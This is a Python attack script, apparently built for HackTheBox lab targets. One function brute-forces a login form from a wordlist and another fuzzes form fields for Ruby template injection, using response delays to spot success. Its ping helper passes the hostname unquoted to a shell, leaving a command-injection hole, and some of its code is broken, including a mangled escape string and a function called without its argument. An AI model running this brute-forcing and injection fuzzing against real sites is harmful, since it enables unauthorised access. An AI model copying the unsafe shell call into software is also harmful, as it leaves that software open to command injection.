#!/usr/bin/env python3

import sys
import argparse
import random
import time
import subprocess

import requests 
from bs4 import BeautifulSoup
import urllib.parse
from urllib.parse import urljoin
from urllib.parse import urlencode
from urllib.parse import urlparse

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHT_GRAY = '\033[37m'
DARK_GRAY = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
WHITE = '\033[97m'

RESET = '\033[0m' # return to standard terminal text color

BACKGROUND_BLACK = '\033[40m'
BACKGROUND_RED = '\033[41m'
BACKGROUND_GREEN = '\033[42m'
BACKGROUND_YELLOW = '\033[43m'
BACKGROUND_BLUE = '\033[44m'
BACKGROUND_MAGENTA = '\033[45m'
BACKGROUND_CYAN = '\033[46m'
BACKGROUND_LIGHT_GRAY = '\third-party033[47m'
BACKGROUND_DARK_GRAY = '\033[100m'
BACKGROUND_BRIGHT_RED = '\033[101m'
BACKGROUND_BRIGHT_GREEN = '\033[102m'
BACKGROUND_BRIGHT_YELLOW = '\033[103m'
BACKGROUND_BRIGHT_BLUE = '\033[104m'
BACKGROUND_BRIGHT_MAGENTA = '\033[105m'
BACKGROUND_BRIGHT_CYAN = '\033[106m'
BACKGROUND_WHITE = '\033[107m'


def format_response(response, payload):
    if response.status_code > 300 and response.status_code < 500:
        print(RED + str(response.status_code) + RESET)
    elif response.status_code > 400 and response.status_code < 600:
        print(YELLOW + str(response.status_code) + RESET)
    print(response.text, "with:", payload)


def cypher(url):

#  url = "http://cypher.htb/login"

  session = requests.Session()
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")

  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  c = [("admin", "admin")]

  with open("wordlist.txt") as f:
      for word in f:
          for u, p in c:
              formatted = f'{{"username":"{word.strip()}","password":"{p}"}}'
              post_response = session.post(post_url, data=formatted, timeout=60)
              format_response(post_response, urllib.parse.quote_plus(formatted))
              time.sleep(1)
              formatted = f'{{"username":"{u}","password":"{word.strip()}"}}'
              post_response = session.post(post_url, data=formatted, timeout=60)
              format_response(post_response, urllib.parse.quote_plus(formatted))
              time.sleep(1)


def weightedgrade(url):

  session = requests.Session()

#  url = "http://10.10.11.253/weighted-grade"
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")
  
  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  payload = {}

  
  for input_tag in form.find_all("input"):
      name = input_tag.get("name")
      value = input_tag.get("value", "")
  
      if name:
          payload[name] = value
      if not value and input_tag.get("type") == "number" and input_tag.has_attr("required"):
          payload[name] = 20

      if not value and input_tag.get("type") == "text" and input_tag.has_attr("required"):
          payload[name] = "test"

  with open("wordlist.txt") as f:
    for x in f:
      for k, v in payload.items():
        if payload[k] == "test":
            temp = payload[k]
            payload[k] = "FUZZVALUE"
            encoded_payload = urlencode(list(payload.items()))
            encoded_payload = encoded_payload.replace('FUZZVALUE', x.strip())

            start = time.monotonic()
            post_response = session.post(post_url, data=encoded_payload, timeout=60)
            elapsed = time.monotonic() - start

            if elapsed > 5:
                print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                print("Full Payload:", encoded_payload)
                print("payload: ", x)
                sys.exit()
            payload[k] = temp
            print(post_response.status_code)
#            print(post_response.text)
        else:
            continue


def check_ping(hostname) -> bool:
    print("hostname:",hostname)
    try:
        subprocess.check_output(
            "ping -c 1 " + hostname, shell=True
        )
    except Exception:
        return False

    print('Ping: Success')
    return True

def parse_arguments():

  parser = argparse.ArgumentParser(
          prog='swb.py',
          description='Swissbomb demo',
          epilog='this is the epilog')

  parser.add_argument('url', help='the URL of your choice: %(prog)s  http://htburl.htb', type=str)
  parser.add_argument('--noping', help='skip the default ping check', action='store_true')
  args = parser.parse_args()
  return args

def main():

  args = parse_arguments()
  url = args.url
  parsed_url = urlparse(url)
  hostname = parsed_url.hostname

  if args.noping:
      print("Skipping the ping check")
  else:
      if not check_ping(hostname):
          print("ping check failed")
          sys.exit()

  print('Target:', url)
  time.sleep(2)
    
# select function to run
  cypher(url)
  sys.exit()
  weightedgrade()
  sys.exit()

if __name__=="__main__":
    main()

